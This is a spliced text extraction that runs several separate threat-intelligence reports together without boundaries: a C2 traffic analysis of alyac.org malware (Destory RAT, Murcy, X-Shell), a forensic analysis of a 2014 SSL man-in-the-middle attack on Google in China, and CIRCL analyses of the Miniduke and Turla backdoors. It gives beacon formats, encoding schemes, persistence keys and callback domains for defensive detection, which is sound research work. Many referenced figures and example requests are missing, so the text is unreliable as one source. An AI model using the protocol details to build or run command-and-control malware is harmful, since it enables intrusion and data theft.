Two request formats were observed ; Variant A ( shown in Figure 3 ) in which the file path requested was ' /update ? product = windows ' , and Variant B ( shown in Figure 4 ) in which the file path requested was ' /update ? id = number ' , where number refers to an eight digit hexadecimal number that changes between requests .
The domain ' path.alyac.org ' only received Variant B requests , while both variants were sent to ' update.alyac.org ' .
The format of Variant A is identical to the communications generated by the Destory RAT used in the SK Communications hack .
The format of Variant B is identical to the communications generated by malware that uses the callback domain ' gm1.network­sec.net ' .
Both variants are associated with the Destory RAT family of malware that dates back at least as far as January 2007 and has been used in several major targeted attacks .
The Destory RAT family includes malware that is detected as : Backdoor . Sogu , Backdoor : Win32/Thoper . A , Trojan . Downloader : Win32/Thoper B .
The observed communications to the ' alyac.org ' subdomains all occurred on TCP port 80 , however , a variety of ports ( TCP ports 8080 , 443 , 12345 etc .
) have been used by this particular family of malware for similar requests .
The port used depends on how the malware is configured .
Connection attempts from each of the compromised computers occurred frequently while the computers were powered on .
For example , one computer connected at 16 second intervals and another approximately every 200 seconds ( ±15 seconds ) .
Three HTTP POST requests were submitted during each connection , each approximately one second apart .
The following malformed user­agent is present in the HTTP POST requests of both variants ( spaces shown here as ' · ' ) : ' Mozilla/4.0· ( compatible ; ·MSIE·6.0 ; ·Windows·NT·5.1 ; SV1 ; ' This user­agent is consistent with that which may be generated by version 6.0 of the Microsoft Internet Explorer web browser running on the Microsoft Windows XP OS , except that it is missing a closing bracket after the last semicolon and a space after the second to last semicolon .
This malformed user­agent is hardcoded into the malware and can be used as a signature to detect the communications .
Four custom headers are also present in the HTTP requests : ' X­Session ' , ' X­Status ' , ' X­Size ' , and ' X­Sn ' .
For some malware in the Destory RAT family not all of these headers will be present .
Cookies were sent with the HTTP POST requests from all but three IP addresses .
A cookie named ' VistorID ' was present any time a cookie was sent .
On occasion a ' Yahoo ' , ' SessionId ' and/or ' fcVal ' cookie was also present in the requests .
The transmission of these cookies could facilitate session stealing and , in the case of the Yahoo cookie , enable unauthorised webmail access .
Each VisitorID cookie contained an expiry time between 9/25/2014 5:50:03 AM and 9/25/2014 6:14:17 AM .
The expiry time is unique for each victim and remained constant ( per victim ) across the HTTP POST requests .
It is possible the victims received the cookie from a C2 server with which they had previously communicated , or , from a server hosting a webpage that caused the initial infection .
It is also possible that the cookie , and the propinquity of the times in the cookies , is coincidental , and that the victims received the cookie from other locations .
Multiple Chinese IP addresses were observed submitting HTTP GET requests to the host ' path.alyac.org ' .
Data contained within the communications indicated that the requests were all sent from a single computer , and therefore that computer was not using a static IP address .
The data from the computer was carried in the requests in an encoded form ( as described below ) within a HTTP header named ' Extra­Data ' .
Two other unique headers were also present in the requests ; ' Extra­Data­Bind ' and ' Extra­Data­Space ' .
The communications appear to be generated by malware known as ' Backdoor . Murcy ' that is reportedly not in widespread use .
An example of an actual HTTP GET request is shown in Figure 5 .
The path in the HTTP GET requests is the computer 's tick count ( i.e .
the number of milliseconds since the system was started ) .
The requests from the victim occurred approximately every 11 seconds when the computer was turned on .
Accordingly , the number in the URI increased by approximately 11000 each request .
Where there was a break in the communications ( presumably due to the computer being shut down or rebooted ) , the counter reset and was between 128703 and 133243 in the next communication .
This indicates that the malware began communicating from this compromised computer within minutes of the computer being booted .
The encoded data within the ' Extra­Data ' header can be decoded using the standard Base64 alphabet but with modified bit placement .
The standard Base64 algorithm decodes encoded strings using consecutive bits read left to right i.e .
bits 0­7 would form the first decoded byte ( shown in Figure 6 ) .
For Murcy communications , the input bits that form each output byte are not taken contiguously .
Figure 7 describes how the first three decoded bytes are constructed , and can be used to implement a decoding algorithm .
For some input data sizes a crude , but functionally equivalent , approach is to reverse the input bytes , apply a standard Base64 decoding , and then reverse the output bytes .
The decoded string contains communications of a format hereon referred to as the ' IP2B ' protocol .
All observed IP2B communications began with a 16 byte header containing the hexadecimal values 0x12345678 and 0x10001000 , and the size of the data .
The decoded version of the Murcy ' Extra­Data ' string from Figure 5 is shown in Figure 8 .
The decoded data reveals the name of the compromised computer , that the computer is running Windows XP Service Pack 3 , its internal IP address is 192.168.132.30 , its screen resolution is set to 1920x1080 and that its locale is ' Chinese ­ China ' .
A summary of each byte in the observed communications is provided in Table 4 .
The data sent to the C2 server is dependent on the C2 instructions received .
Commands the Murcy malware reportedly understands are shown in Annex D. ( SafeZoneCast , 2011 ) The Murcy malware is commonly named ' cydll.dll ' , creates a mutual exclusion ( mutex ) handle named ' Cy1.0Mutex ' , and installs a service named ' CyService ' with a display name of ' CyService Service ' .
It also commonly gains persistence by creating the registry key ' ServiceDll = % System % \cydll.com ' in the ' ControlSet001 ' key in the Local Machine hive of the Windows registry .
Symantec Corporation discovered Backdoor . Murcy on 31 July 2011 , yet the same malware appears to have been first detected by Kaspersky Lab on 11 January 2010 .
Malware samples with the same attributes date back to at least October 2009 .
This suggests that the Murcy malware has been in use for at least two years .
Known Murcy malware uses the callback domains ' albertstein.ddns.us ' , ' alvington.jetos.com ' , ' ftp.xmahone.ocry.com ' , and ' superaround.ns02.biz ' .
These callback domains were all also reportedly used in the March 2011 intrusion into RSA 's network .
That intrusion resulted in the theft of information related to RSA 's SecurID two­factor authentication products .
The stolen information was later used to enable targeting of defence contractors .
( Coviello , 2011 ) .
( Rasmussen , 2011 ) ( US­CERT , 2011 ) .
Numerous computers were observed communicating with an ' alyac.org ' subdomain on TCP port 80 via the ' Oscar ' protocol .
Most , but not all , of the computers also communicated to the same domain via the ' Update ? ' communications .
The protocol is believed to be associated with the same malware that produces the ' Update ? ' communications – the Destory RAT .
Each compromised computer communicated at a different interval to the others , and accordingly , the malware on each of the compromised computers appears to have been individually configured .
For example , one computer communicated every 12 seconds and another every 16 seconds .
Encrypted data was sent during each communication .
The length of the encrypted data in each packet varied between 16 bytes and 89 bytes .
After sending the encrypted data the malware waited for a response .
Two computers were observed communicating with ' update.alyac.org ' via the ' BB ' protocol .
One of the computers used a Chinese IP address , the other a South Korean IP address .
The ' BB ' protocol has a 21 byte header containing a 4 byte XOR key that can be used to decode the remaining bytes in the packet .
The packet format is described in Table 5 .
Once decoded , the data reveals a basic beacon containing the computer name and IP address of the infected computer .
After sending the basic beacon , the compromised computers waited for a response from the server , then closed the connection when they had not received a response from the server within five seconds .
Both of the compromised computers reattempted the communications approximately every eight seconds .
On some days the high frequency of the beacon activity resulted in over 10000 connection attempts per victim in a 24 hour period .
A single computer was observed communicating with the domain ' update.alyac.org ' via the ' DB ' protocol .
The communications originated from the same Chinese computer network as one of the ' BB ' victims but from a different computer on that network .
It is not known what malware generates the ' DB ' communications , or whether it is the same malware that generates the ' BB ' communications .
The communications reveal detailed OS and system information about the compromised computer as shown in Table 6 .
The OS information reveals that the compromised computer is running Windows 2003 Server Service Pack 2 .
The detailed system information reveals that the compromised computer has an Intel Pentium Pro­class processor , four logical processors and an LGA 775 Central Processing Unit ( CPU ) socket .
The DB communications typically occurred at intervals of between 4 and 92 seconds , however , sometimes they were much further apart .
After sending the detailed beacon to the command and control server , the compromised computer appeared to expect a response from the server .
One computer using a static South Korean IP address was observed sending the five bytes 0x51 0x31 0x39 0x21 0x00 ( `` \x51Q19 ! '' ) to ' update.alyac.org ' on TCP port 80 up to nearly 800 times a day .
While the communications did not occur continuously ( likely due to the computer being turned off ) , when they did occur a new connection was attempted , and the packet containing ' Q19 ! ' sent , approximately every minute .
It is assumed these communications are generated by malware but it is not known what malware , or which other callback domains that malware uses .
The malware appeared to expect a response from the server after it sent each packet .
The communications to ' alyac.org ' subdomains occurred frequently from each compromised computer .
A summary of typical observed intervals between communications , broken down by protocol , is shown in Table 7 .
The single LURK victim was typically observed beaconing at 26 second intervals , the Murcy victim at 11 second intervals , and the Qdigit victim at 60 second intervals .
All of the X­Shell C601 victims were typically observed beaconing at 36 second intervals , and the BB victims at 8 second intervals .
The beaconing interval of the other victims does not appear to be a fixed time , and instead a degree of randomness appears to be employed .
As shown in Table 8 , the observed communications all occurred on TCP port 80 or TCP port 443 ­ ports commonly used for legitimate purposes .
While most malware uses the local DNS server settings of the compromised computer to resolve its callback domain to an IP address , in some observed communications the attackers appear to have specifically chosen the DNS servers .
The majority of X­Shell C601 malware that called back to ' path.alyac.org ' used Google DNS servers , presumably instead of the DNS settings on the compromised computers .
The X­Shell C601 malware supports use of a specified DNS server to resolve callback domains , and it appears the attackers have made use of this functionality .
The ' Update ? ' , Oscar , Murcy and Qdigit victims all appear to have used their local DNS server settings to resolve the callback domains .
On the other hand , the single LURK victim used Google DNS servers to resolve its callback domain , as did the Chinese BB victim ( and associated DB victim ) but not the South Korean BB victim .
This suggests that the LURK , BB and DB malware may also have the same DNS functionality as X­Shell , although it is possible that the victims are configured to use the Google servers as their regular DNS servers , and that the malware is not using different servers .
The observed communications have links to a variety of malware and to a number of attacks , as illustrated in Figure 9 , and detailed below .
The ' Update ? ' communications and the Oscar communications are both associated with the Destory RAT family of malware .
This malware family has been used in a number of targeted attacks including the July 2011 SK Communications hack .
Through shared infrastructure the malware has links to the series of coordinated , covert and targeted cyber attacks dubbed ' NightDragon ' , and also to the recent series of targeted attacks that have used ' Sykipot ' malware .
Through a shared callback domain the Destory RAT malware also has links to socially engineered emails including those that targeted experts on the relationship of the United States with Japan , China and Taiwan .
The Destory RAT is also connected to LURK malware via a compromised code signing certificate which was used to sign both pieces of malware , and to IP2B communications by a shared callback domain .
The X­Shell RAT has been used in numerous attacks but many of these attacks are not expected to be associated with the same attackers .
On the other hand , the callback domains used by Murcy malware suggest that the malware is used , perhaps solely , by the attackers responsible for the March 2011 RSA breach .
IP addresses , to which ' alyac.org ' and its subdomains previously pointed , associate the domain , and the attackers behind it , with a raft of activity .
This includes activity involving callback domains registered to appear as though they were associated with legitimate , trusted entities , and domains registered to a ' Lee Cooper ' that tie back to the SK Communications hack .
Destory RAT malware is known to communicate with the callback domain ' vupdate.mail­kr2.com ' , while NightDragon malware is known to communicate with ' ma2.mail­kr2.com ' and ' www2.mail­kr2.com ' .
The communications sent to ' www2.mail­kr2.com ' are similar , but not identical , to IP2B communications , further linking the observed activity .
Other ' mail­kr2.com ' subdomains include ' cb85.mail­kr.com ' , ' sa****.mail­kr2.com ' , and ' skylie.mail­kr2.com ' ­ at least two of which are known to be associated with malware .
Destory RAT malware is known to use the callback domain ' bbs.afbjz.com ' , while known NightDragon malware uses the callback domain ' blog.afbjz.com ' .
As of 3 February 2012 , both of the subdomains point to US IP address 67.90.204.228 .
This overlap in infrastructure appears to be of particular significance given the following links between other activity on the same IP address .
As of 6 February 2012 , the domains ' gmail.mail­ ru2.com ' , ' live.mail­ru2.com ' , ' mail­ru2.com ' , ' msn.mail­ru2.com ' , ' usaisbig.oerco.com ' , ' whois.oerco.com ' , ' www.afbjz.com ' , and ' www2.oerco.com ' also point to IP address 67.90.204.228 .
At least one of these domains is otherwise known to be associated with malware .
The ' oerco.com ' domain is registered to the same person as ' afbjz.com ' , associating the two domains with a single entity .
The ' mail­ru2.com ' domain appears to be associated with the same entity as the ' mail­kr2.com ' domain used by NightDragon malware and the Destroy RAT ( as described above ) .
While the domains were registered using different details , they were registered on the same day through the same domain name registrar , and the records later updated minutes apart56 .
This suggests that all C2 activity involving IP address 67.90.204.228 may be associated with a single entity .
The recently expired domain ' todaygonever.com ' also previously pointed to the same IP address .
As will be discussed later in the paper , ' todaygonever.com ' is directly associated with malware and has links to the recent series of Sykipot attacks .
The recently expired domains ' goodfeelingauto.com ' and ' deadlinely.com ' also pointed to the same IP address and were likely associated with the same attackers .
Other Destory RAT callback domains are also otherwise linked to malicious activity .
For example , the callback domain ' www.adv138mail.com ' was used by a Poison Ivy RAT sent in a July 2011 socially engineered email campaign .
The emails contained an attachment , named ' Meeting Agenda.pdf ' , which attempted to exploit a vulnerability specified by the Common Vulnerabilities and Exposure ( CVE ) number 2010­ 2883 to install the Poison Ivy RAT .
A clean decoy PDF file was shown to the user when the attachment was opened .
A copy of the text used in the socially engineered email campaign is shown in Figure 10 .
The domain ' www.adv138mail.com ' is also associated with malware detected by antivirus software as ' Backdoor . Win32.Delf.abow ' .
Other known subdomains include : - ' asm.adv138mail.com ' , - ' dns.adv138mail.com ' , - ' ftp.adv138mail.com ' , - ' ihi.adv138mail.com ' , - ' nov.adv138mail.com ' .
These domains ( with the possible exception of the ' dns ' and ' ihi ' subdomains ) have all pointed to the same infrastructure as the domains ' pu.flower­ show.org ' and ' www.mailsignin.net ' .
That shared infrastructure is known to have been used to send socially engineered emails that contained an attachment named ' invtation.pdf ' [ sic ] .
Similar to the ' Meeting Agenda ' attachment , ' invtation ' installs a Poison Ivy RAT , but one configured to communicate with the callback domain ' pu.flower­show.org ' .
The text used in the emails is shown in Figure 11 .
In addition to having previously shared infrastructure with the known Destory RAT callback domain ' www.adv138mail.com ' , the domain ' www.mailsignin.net ' has also previously shared infrastructure with at least two other known Destory RAT callback domains .
The domain ' www.mailsignin.net ' previously pointed to IP address 175.45.22.220 , as did the known Destory RAT callback domains ' newhose.ntimobile.com ' and ' sms.servegame.com ' .
A number of subdomains of the Destory RAT­associated domain ' join3com.com ' also previously pointed to the same IP address .
These links suggest that many attacks in which the Destory RAT has been used are linked , not only by the malware , but also through C2 infrastructure .
This further supports the notion that the Destory RAT was developed by , or for , particular attackers and that most , if not all , of the malicious activity involving it is attributable to those attackers .
The Destory callback domains also have links to additional malware .
For example , the domain ' network­sec.net ' has been used by the Destory RAT ( ' gm1.network­sec.net ' ) , by Poison Ivy malware ( ' yoyo.network­sec.net ' ) and by ' Backdoor­FCQ ' ( ' pingabm.network­sec.net ' , ' ' psbm11025.network­ sec.net ' and ' psbm10.network­sec.net ' ) .
The observed LURK communications appear to be the same as those generated by malware that was digitally signed using a compromised code signing certificate that was used to sign a Destory RAT , and other malware used in several attacks .
That malware communicates with the domain ' office.windowupdate.org ' – a domain that is linked to ' alyac.org ' not only by the communications protocol but also by both domain registration tactic and infrastructure .
( Fagerland , 2011 ) The Destory RAT malware used in the SK Communications hack is identical , except for its configuration , to malware that communicates with the callback domain ' wow.travlman.com ' .
The callback domain previously pointed to the same IP address as that used in the SK Communications hack .
Both of the malicious files were compiled from the same code on 27 September 2010 at 09:17:04 Greenwich Mean Time ( GMT ) , and later configured .
The callback domain ' wow.travlman.com ' is also used by malware that produces ' IP2B ' communications of an identical format to those decoded from the ' Extra­Data ' in the Murcy communications .
This highlights an additional link between the Destory RAT and the IP2B communications .
Several other ' travlman.com ' sub­domains are known to exist including at least one that is associated with malware .
The sub­domain ' dm.travlman.com ' is the callback used by malware detected by antivirus software as ' Trojan : Win32/Boupke ' .
The majority of the known callback domains for Murcy malware were used in the March 2011 RSA breach .
This suggests that the attackers responsible for the RSA breach also use the Murcy malware .
Given that the malware is reportedly not in widespread use , the Chinese server communicating with ' path.alyac.org ' may have been compromised by the same attackers responsible for the RSA breach .
X­Shell RAT The X­Shell RAT is commercially available software that appears to have been used in a number of attacks .
There are numerous versions of the X­Shell RAT , and not all produce the same communications .
Malware that generates the same X­Shell C601 communications observed to ' path.alyac.org ' appears to have been used in a number of attacks .
Malware that generates similar communications also appears to have been used in a number of attacks .
That malware is thought to be an X­Shell C603 RAT and not an X­Shell C601 RAT .
It is not known whether any of these malicious files were used by the same attackers who used the X­shell malware which communicates with ' path.alyac.org ' .
The domain ' alyac.org ' previously pointed to a C2 server located at IP address 222.122.20.241 and another located at IP address 202.30.224.240 .
These IP addresses are associated with a number of other callback domains including ' bbs.ezxsoft.com ' , ' pc.nprotects.org ' , and ' wow.travlman.com ' ­ the latter being linked to both the Destory RAT and IP2B communications ( as previously discussed ) .
In addition to both having shared infrastructure with ' alyac.org ' , the two callback domains ' bbs.ezxsoft.com ' and ' pc.nprotects.org ' are used by malware that creates a uniquely named directory .
This indicates a direct relationship between the two pieces of malware .
The domain ' ezxsoft.com ' was registered by the same entity ( ' Lee Cooper ' ) as a domain used in the SK Communications hack ( ' ro.diggfunny.com ' ) , further linking it to the same attackers .
The C2 server and the callback domains also have links to a myriad of other malicious activity .
As previously discussed , before it expired , ' todaygonever.com ' pointed to a C2 server associated with both the Destroy RAT and NightDragon malware .
The same domain is also associated with Sykipot activity through shared C2 server infrastructure , and domain registration information .
Over its lifetime the domain ' todaygonever.com ' pointed to numerous IP addresses , many of which are not noteworthy as they were assigned to servers that hosted numerous websites .
Four of the IP addresses , however , are of particular note – IP addresses 67.90.204.228 ( as previously discussed ) , 67.79.149.90 , 209.133.72.83 and an IP address allocated to a large US financial institution .
IP address 67.79.149.90 previously hosted the known Sykipot domain ' help.newcarstyle.com ' .
Both IP address 67.79.149.90 and IP address 209.133.72.83 previously hosted ' bluelightness.com ' subdomains .
They therefore have additional links to Sykipot activity as ' shopping.bluelightness.com ' was previously hosted on IP address 209.53.155.244 ­ the same IP address as the known Sykipot domains ' www.topix21century.com ' and ' notes.topix21century.com ' .
The ' bluelightness.com ' domain is also linked to ' mail­kr2.com ' ­ a Destory RAT and NightDragon domain previously discussed .
Both domains share infrastructure with the domain ' worldsecuritys.com ' .
As of 6 February , the domains ' file.filesdelete.com ' , ' news.welldone123.net ' and ' well.welldone123.net ' all point to the IP address allocated to the large US financial institution ( to which ' todaygonever.com ' also previously pointed .
) The domain ' welldone123.net ' is a known Sykipot callback domain .
The domain ' filesdelete.com ' is also otherwise associated with malware .
The email address listed in the domain registration for ' todaygonever.com ' was ' janagreen2000 @ gmail.com ' .
The same contact email address ( but different name , address , and phone and fax numbers ) was also used in the domain registration for ' centurycpc.com ' , ' filesdelete.com ' , ' greenrightway.com ' , ' quicklyfindme.com ' , and ' newcarstyle.com ' – at least two of which are known Sykipot malware domains .
- Increasingly , instead of malware using the default DNS servers on a compromised computer to resolve its callback domains to IP addresses , attackers will specify DNS servers for the malware to use .
This has significant implications for network defenders .
Such requests , if allowed , will bypass the victim 's DNS servers and defeat any blacklists used by the victim 's own DNS servers .
Furthermore , the requests will not appear in the victim 's DNS server logs , making detection and investigation more difficult .
- Organisations should consider blocking internal DNS traffic to all locations other than the company 's own DNS servers .
Furthermore they should be alert to any DNS communication attempts to locations other than the company 's own DNS servers , as this may be an indicator of a malware infection .
- When code signing certificates are revoked the date of effect of the revocation is chosen so that , where possible , legitimate software signed with the certificate continues to validate .
Unfortunately , this means that sometimes malware signed with a compromised certificate will also continue to validate ( despite the revocation ) .
- Some malware attempts to communicate with C2 infrastructure at frequent intervals .
The frequency of these communication attempts can be used to detect the malicious activity .
- TCP port 443 traffic is often allowed out of a network without inspection by network security appliances as it is expected to be legitimate , encrypted SSL communications that can be difficult to inspect .
Unfortunately , attackers take advantage of this by using the port to bypass security appliances to communicate with a C2 server ( such as with the observed X­Shell communications ) .
- Attackers often reuse the same code for their malware .
Sometimes they will recompile the code , sometimes they will merely reconfigure the malware .
This alters the file hash and therefore such a hash is not an effective signature for other configurations of the malware .
Hashes of the individual code sections ( e.g .
.text
, .rdata
, .reloc
) make for more robust detection as sections within the malicious files often remain the same .
- The majority of legitimate external network communications use the DNS protocol to determine their destination 's IP address .
Outbound network activity that occurs without a DNS lookup should be treated with suspicion until the purpose of the communications can otherwise be determined .
- Blocking outbound communication attempts that are not preceded by a DNS lookup can be effective in blocking C2 communication attempts that are made direct to an IP address ( such as to an IP address listed within an X­Shell configuration webpage ) .
Legitimate destination IP addresses should be whitelisted to prevent legitimate activity from also being blocked .
- Attackers will sometimes continue to use a callback domain even when it is listed on blacklists and in multiple malware analysis reports .
- Blacklisting a domain can be useful but taking the time to research the domain and associated activity can help with the development of more effective , longer term mitigation strategies .
Thursday , 04 September 2014 23:55:00 ( UTC / GMT ) The Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and Google .
We ' ve performed technical analysis of the attack , on request from GreatFire.org , and can confirm that it is a real SSL MITM against www.google.com and that it is being performed from within China .
We were contacted by GreatFire.org yesterday ( September 3 ) with a request to analyze two packet captures from suspected MITM - attacks before they finalized their blog post .
The conclusions from our analysis is now published as part of GreatFire.org 's great blog post titled `` Authorities launch man - in - the- middle attack on Google '' .
In their blog post GreatFire.org write : From August 28 , 2014 reports appeared on Weibo and Google Plus that users in China trying to access google.com and google.com.hk via CERNET , the country 's education network , were receiving warning messages about invalid SSL certificates .
The evidence , which we include later in this post , indicates that this was caused by a man - in - the - middle attack .
While the authorities have been blocking access to most things Google since June 4th , they have kept their hands off of CERNET , China 's nationwide education and research network .
However , in the lead up to the new school year , the Chinese authorities launched a man - in - the - middle ( MITM ) attack against Google .
Our network forensic analysis was performed by investigating the following to packet capture files : The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .
We do not disclose the client IP addresses for privacy reasons , but they both seem legit ; one from Peking University ( netname PKU6-CERNET2 ) and the other from Chongqing University ( CQU6-CERNET2 ) .
Both IP addresses belong to AS23910 , named `` China Next Generation Internet CERNET2 '' .
The IP addresses received for www.google.com were in both cases also legit , so the MITM was n't carried out through DNS spoofing .
The Peking University client connected to 2607 : f8b0:4007:804 : : 1013 ( GOOGLE - IPV6 in United States ) and the connection from Chongqing University went to 2404:6800:4005:805 : : 1010 ( GOOGLE_IPV6_AP-20080930 in Australia ) .
The Time - To - Live ( TTL ) values received in the IP packets from www.google.com were in both cases 248 or 249 ( note : TTL is actually called `` Hop Limit '' in IPv6 nomenclature , but we prefer to use the well established term `` TTL '' anyway ) .
The highest possible TTL value is 255 , this means that the received packets have n't made more than 6 or 7 router hops before ending up at the client .
However , the expected number of router hops between a server on GOOGLE - IPV6 and the client at Peking University is around 14 .
The low number of router hops is is a clear indication of an IP MITM taking place .
Here is an IPv6 traceroute from AS25795 in Los Angeles towards the IP address at Peking University ( generated with ARP Networks ' 4or6.com tool ) : As can be seen in the traceroute above , seven hops before the client we find the 2001:252 : : /32 network , which is called `` CNGI International Gateway Network ( CNGIIGN ) '' .
This network is actually part of CERNET , but on AS23911 , which is the network that connects CERNET with its external peers .
A reasonable assumption is therefore that the MITM is carried out on the 2001:252 : : /32 network , or where AS23910 ( 2001 : da8:1 : : 2 ) connects to AS23911 ( 2001:252:0:1 : :1 ) .
This means that the MITM attack is being conducted from within China .
The round - trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .
The expected round - trip time for connecting from CERNET to a Google server overseas would be around 150ms or more .
However , in the captures we ' ve analyzed the TCP SYN+ACK package was received in just 8ms ( Peking ) and 52ms ( Chongqing ) respectively .
Again , this is a clear indication of an IP MITM taking place , since Google can not possibly send a response from the US to CERNET within 8ms regardless of how fast they are .
The fast response times also indicate that the machine performing the MITM is located fairly close to the network at Peking University .
Even though the machine performing the MITM was very quick at performing the TCP tree - way handshake we noticed that the application layer communication was terribly slow .
The specification for the TLS handshake ( RFC 2246 ) defines that a ClientHello message should be responded to with a ServerHello .
Google typically send their ServerHello response almost instantly , i.e .
the response is received after one round - trip time ( 150ms in this case ) .
However , in the analyzed captures we noticed ServerHello response times of around 500ms .
We extracted the X.509 certificates from the two capture files to .cer
files using NetworkMiner .
We noticed that both users received identical certificates , which were both self signed for `` google.com '' .
The fact that the MITM used a self signed certificate makes the attack easily detectable even for the non- technical user , since the web browser will typically display a warning about the site not being trusted .
Additionally the X.509 certificate was created for `` google.com '' rather than `` * .google.com '' .
This is an obvious miss from the MITM'ers side since they were attempting to MITM traffic to `` www.google.com '' but not to `` google.com '' .
Certificate SHA1 fingerprint : f6beadb9bc02e0a152d71c318739cdecfc1c085d Certificate MD5 fingerprint : 66 : D5 : D5:6A : E9:28:51:7C:03:53 : C5 : E1:33:14 : A8:3B A copy of the fake certificate is available on Google drive thanks to GreatFire.org .
All evidence indicates that a MITM attack is being conducted against traffic between China 's nationwide education and research network CERNET and www.google.com .
It looks as if the MITM is carried out on a network belonging to AS23911 , which is the outer part of CERNET that peers with all external networks .
This network is located in China , so we can conclude that the MITM was being done within the country .
It 's difficult to say exactly how the MITM attack was carried out , but we can dismiss DNS spoofing as the used method .
The evidence we ' ve observed instead indicate that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy .
An alternative to changing the router config would also be to add an in - line device that redirects the desired traffic to the SSL proxy .
However , regardless of how they did it the attacker would be able to decrypt and inspect the traffic going to Google .
We can also conclude that the method used to perform the MITM attack was similar to the Chinese MITM on GitHub , but not identical .
In the scope of targeted attacks with a malware labeled as Miniduke by Kaspersky Labs , CIRCL was interested in the way the malware 's later stages work and what kind of interesting information they reveal ( e.g .
techniques , style , IOCs ) .
No public analysis was found except the mention in Kaspersky 's report of a custom backdoor , so CIRCL took one of the known samples and started this analysis .
This work has been done with utmost care , following best practices in software reversing , forensic investigations and/or information gathering .
However , the work is only covering small aspects ( based on the indicators given , lacking full context ) and not an exhaustive analysis , and hence the report is as - is , not giving any guarantees of completeness or claiming absolute accuracy .
The document is classiﬁed as TLP : WHITE , therefore CIRCL encourages everyone to share this analysis report as - is without modiﬁcation .
Sample B , contained in Sample A , can be categorized as an exhaustive backdoor , implementing any kind of functionality that can be expected for this kind of attacks .
Despite the fact that it does n't implement any particular fancy or new technique , the code quality appears to be clean and robust , making rich use of C structures and logging and it shows on some places that it is targeting organizational infrastructures rather than home users .
Sample A can be categorized as a container , obfuscating and compressing the real payload .
Sample A has been debugged until Sample B 's decompression ﬁnished .
The memory segment was dumped to disk for further analysis .
The focus of the analysis then shifted to Sample B .
Sample B is identiﬁed to be a HTTP controlled backdoor , enabling the attacker to take full control over the victim computer .
The analysis has been done using a mixed - approach of dynamic analysis and static analysis in order to overcome some of the obfuscation and encryptions used by the malware .
Some of the techniques might have also an impact on the interpretation of the malware .
Unfortunately , when we started this investigation , the domain is now pointing to an IP address of Google and returning a 404 Not Found page only .
An interaction following the protocol of this malware is therefore no longer possible .
The analysis of Sample B revealed the commands as shown in table 1 The attacker controls the remote computer via HTTP GET and POST requests like the following : The request is encoded in a custom BASE64 encoding , using the following alphabet : The malware connects via HTTP GET and POST requests to and the path is ﬁxed : The variable part is the custom BASE64 encoded string corresponding to `` i= '' .
A full request looks like : The user agent is always Sent accept headers are : The malware creates in a value ' AppID ' with the data it calculates from GetTickcount ( ) , used as an identiﬁer / mutex .
No persistency mechanisms have been identiﬁed .
We assume the ﬁle is only dropped and/or executed on request via stage 2 of Miniduke and not running persistently .
Update on Jul 03 2014 : F - Secure released an analysis of the latest MiniDuke evolution , called `` CosmicDuke '' , mentioning similar loaders in old and new samples .
That 's why we updated this document to include a graph of the loader : Decryption of module and function names Command `` exec '' - standard process creation : Command `` exeu '' - process creation in a domain environment The domain news.grouptumbler.com is currently resolving to 173.194.70.101 Before that date , the IP was 200.63.46.33 The IP 200.63.46.33 was hosting the following domains : None , some or all domains in this list might be malicious as well .
↑ Back to Publications and Presentations You can report incidents via our oﬀicial contact including e - mail , phone or use the Anonymous reporting form .
During the last weeks , various samples of Uroburos ( also named Urob , Turla , Sengoku , Snark and Pﬁnet ) were analyzed and reports have been published 1234 , also analyses about a suspected predecessor , Agent.btz , are public 5 .
CIRCL analyzed an older version of Turla , known as a representative of the Pﬁnet malware family .
The objective of this analysis is to gather additional Indicators of Compromise or behaviors in order to improve detection and to discover additional insights into the malware .
This document is not considered a ﬁnal release but a work - in- progress document .
Scanned : 2014 - 03 - 16 01:12:54 - 49 scans - 37 detections ( 75.0 % ) No version information included .
SECTION 1 ( .text
) : SECTION 2 ( .rdata
) : SECTION 3 ( .data
) : SECTION 4 ( .rsrc
) : SECTION 5 ( .reloc
) : The order of strings embedded in clear text in Sample A indicate that this ﬁle contains several other ﬁles , because the DOS stub ( ! This program can not be run in DOS mode .
) is present multiple times .
We include interesting strings in the corresponding subsection .
Sample A can be considered an installer or dropper .
It drops ﬁles into the system and initializes the environment for production .
First , it probes if a virtual disk is present on the system .
If not , the virtual disk is being created with ﬁle system NTFS , using FormatEx from Microsofts fmifs.dll .
The presence of the malware 's conﬁguration ﬁle is tested : If not found , it is dropped from the resource section 0x88d90 .
The following ﬁles are dropped depending on whether Windows is running in 32 bit or 64 bit .
Independently from the architecture , the ﬁle names of the dropped ﬁles are the same , but a speciﬁc version of the ﬁle is dropped according to the operating system architecture .
This is achieved by a logic similar to the following one .
This is done for all ﬁles except the conﬁguration ﬁle .
The function create_from_resources ( ) looks like : Subsequently , after dropping the correct ﬁles , the malware makes itself persistent on the system and creates a service with the following parameters , which loads the ﬁle usbdev.sys as a kernel driver : If during installation anything goes wrong , the registry keys are deleted .
The ﬁles however are not .
During the installation process , extensive logging is ensuring good visibility on potential installation problems .
The attacker uses english language for the logging , although he is lacking attention to detail when it comes to correct usage of the language , as the following examples demonstrate : Language deﬁcits are also demonstrated in other ﬁles of this collection .
We show them in a separate chapter .
A list of dropped ﬁles is given in the next chapter .
Scanned : 2014 - 03 - 23 21:28:41 - 51 scans - 36 detections ( 70.0 % ) Scanned : 2011 - 07 - 07 04:43:10 - 43 scans - 19 detections ( 44.0 % ) Flags : 00000000 Time stamp : Fri Oct 2 09:07:16 2009 Version : 0.0 DLL name : CARBON.dll Ordinals base : 1 .
( 00000001 ) # of Addresses : 2 .
( 00000002 ) # of Names : 2 .
( 00000002 ) 1 .
00002CB9 ModuleStart 2 .
0000266C ModuleStop Scanned : 2011 - 05 - 08 11:16:36 - 42 scans - 23 detections ( 54.0 % ) Size : 135168 bytes Type : PE32 executable ( DLL ) ( GUI ) Intel 80386 , for MS Windows Date : 0x4AC5A662 [ Fri Oct 2 07:06:10 2009 UTC ] EP : 0x20015d85 .text
0/5 CRC : Claimed : 0x0 , Actual : 0x2ccd6 [ SUSPICIOUS ] 1 .
